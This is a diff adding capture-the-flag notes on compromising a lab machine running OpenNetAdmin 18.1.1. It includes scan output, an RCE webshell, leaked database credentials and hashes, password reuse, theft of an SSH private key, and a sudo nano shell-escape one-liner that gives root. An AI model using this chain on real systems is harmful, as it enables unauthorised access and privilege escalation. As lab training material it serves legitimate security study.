@@ -1,0 +1,55 @@
+OS:
+- Linux (Ubuntu)
+
+Open Ports:
+- 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+- | ssh-hostkey:
+- |   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
+- |   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
+- |_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
+- 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+- |_http-server-header: Apache/2.4.29 (Ubuntu)
+- |_http-title: Apache2 Ubuntu Default Page: It works
+
+- enumerating port 80
+- Dirbuster:
+/music (Status: 301) [Size: 312]
+/artwork (Status: 301) [Size: 314]
+/sierra (Status: 301) [Size: 313]
+/server-status (Status: 403) [Size: 277]
+
+- user input at http://10.10.10.171/artwork/contact.html#
+- found service opennetadmin installed at /ona/
+- version shows: v18.1.1
+- rce exploit available
+- ran to get webshell
+- found db creds in file:
+ona_sys:n1nj4W4rri0R!
+
+- log into mysql db
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| ona_default        |
++--------------------+
+
+- found creds from users table in db:
+| id | username | password                         | level | ctime               | atime               |
++----+----------+----------------------------------+-------+---------------------+---------------------+
+|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2020-12-06 22:00:35 | 2020-12-06 22:00:35 |
+|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2007-10-30 03:00:17 | 2007-12-02 22:10:26
+
+- trying ona_sys db password for all existing users
+- logged in as user jimmy
+- jimmy has dir in /var/www/html
+- not the webserver on port 80
+- using netstat to find other listening ports
+- confirming with curl, listens on port 52846
+- curling for index.php runs cmd to cat joanna's ssh priv key
+- ssh as joanna using id rsa priv key
+- checking sudo permissions
+- can run nano as sudo for one file
+- gtfobins to find method to break into root shell
+- ^R^X -> reset; sh 1>&0 2>&0
+- got root access
